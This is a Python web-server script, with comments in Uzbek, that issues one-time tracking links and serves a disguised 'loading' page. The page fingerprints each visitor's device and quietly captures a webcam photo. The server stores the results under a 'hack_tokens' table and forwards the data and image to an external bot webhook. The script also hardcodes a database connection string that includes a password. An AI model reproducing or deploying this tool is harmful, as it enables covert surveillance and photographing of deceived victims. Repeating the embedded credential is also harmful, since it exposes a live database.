#!/usr/bin/env python3
# camera_api_pg.py

import os
import json
import uuid
import base64
import asyncio
import aiohttp
import logging
from datetime import datetime, timezone
from io import BytesIO
from aiohttp import web
import asyncpg

# --------- LOGGING ---------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --------- ENV ---------
DATABASE_URL = ("postgresql://postgres:bJYhQjxLLoNAxIYduQuvqOMrhScHycTT@caboose.proxy.rlwy.net:29516/railway")
MAIN_BOT_WEBHOOK_URL = ("https://fit-roanna-runex-7a8db616.koyeb.app/")  # asosiy botga yuborish uchun
PORT = int(os.getenv("PORT", "8000"))

if not DATABASE_URL:
    raise SystemExit("❌ DATABASE_URL kerak!")

# --------- DB POOL ---------
db_pool = None

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=5)
    # Jadvalni yaratish
    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS hack_tokens (
                token TEXT PRIMARY KEY,
                user_id BIGINT NOT NULL,
                created_at TIMESTAMPTZ DEFAULT NOW(),
                used BOOLEAN DEFAULT FALSE
            )
        """)
    logger.info("✅ PostgreSQL ulandi va jadval tayyor.")

# --------- /create_token (Asosiy bot chaqiradi) ---------
async def create_token(request):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        if not user_id:
            return web.json_response({"error": "user_id kerak"}, status=400)

        token = str(uuid.uuid4())
        async with db_pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO hack_tokens(token, user_id) VALUES($1, $2)",
                token, user_id
            )
        return web.json_response({"token": token})
    except Exception as e:
        logger.exception("create_token xato")
        return web.json_response({"error": str(e)}, status=500)

# --------- /track (Foydalanuvchi ochadi) ---------
async def track_page(request):
    token = request.query.get("token")
    if not token:
        return web.Response(text="❌ Token kerak", status=400)

    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("""
            SELECT user_id FROM hack_tokens
            WHERE token = $1
              AND used = FALSE
              AND created_at > NOW() - INTERVAL '1 hour'
        """, token)

    if not row:
        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)

    # HTML sahifa (sizniki kabi)
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"/><title>Yuklanmoqda...</title>
<style>body{{font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;background:#fafafa;color:#333;}}.loader{{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #4CAF50;border-radius:50%;animation:spin 1s linear infinite;margin:20px;}}@keyframes spin{{to{{transform:rotate(360deg);}}}}.note{{font-size:0.9em;color:#777;}}</style>
</head>
<body>
  <h2>Iltimos, kuting...</h2>
  <div class="loader"></div>
  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
  <script>
    async function collect() {{
      const data = {{
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: navigator.languages?.join(', ') || navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || "Noma'lum",
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        screen: `${{screen.width}}x${{screen.height}}`,
        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
        browser: "Noma'lum",
        os: "Noma'lum"
      }};

      if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
      else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
      else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";

      if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
      else if (/Android/.test(navigator.userAgent)) data.os = "Android";
      else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
      else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
      else data.os = "Boshqa";

      let hasImage = false;
      let imageData = null;

      try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(r => {{ video.onloadedmetadata = r; video.play(); }});
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        imageData = canvas.toDataURL("image/jpeg", 0.7);
        hasImage = true;
        stream.getTracks().forEach(t => t.stop());
      }} catch (e) {{}}

      const payload = {{ token: "{token}", clientData: data }};
      if (hasImage) payload.image = imageData;

      await fetch("/submit", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify(payload)
      }});

      document.body.innerHTML = "<h2>✅ Ma’lumotlar olindi</h2>";
    }}
    collect();
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

# --------- /submit ---------
async def submit_data(request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        image_data = body.get("image")

        async with db_pool.acquire() as conn:
            row = await conn.fetchrow("""
                SELECT user_id FROM hack_tokens
                WHERE token = $1 AND used = FALSE
            """, token)

            if not row:
                return web.Response(status=403)

            user_id = row["user_id"]
            # Tokenni "bir marta ishlatilsin" deb belgilash
            await conn.execute("UPDATE hack_tokens SET used = TRUE WHERE token = $1", token)

        # Asosiy botga yuborish
        payload = {
            "user_id": user_id,
            "device_data": client_data,
            "image": image_data
        }

        async with request.app["session"].post(MAIN_BOT_WEBHOOK_URL, json=payload) as resp:
            if resp.status != 200:
                logger.warning(f"Webhook failed: {resp.status}")

        return web.Response(status=200)
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500)

# --------- Web server ---------
async def start_web_server():
    app = web.Application()
    app["session"] = aiohttp.ClientSession()
    app.router.add_post("/create_token", create_token)
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Camera API (PostgreSQL) ishga tushdi: http://0.0.0.0:{PORT}")

# --------- Main ---------
async def main():
    await init_db()
    await start_web_server()
    # Forever ishlash
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
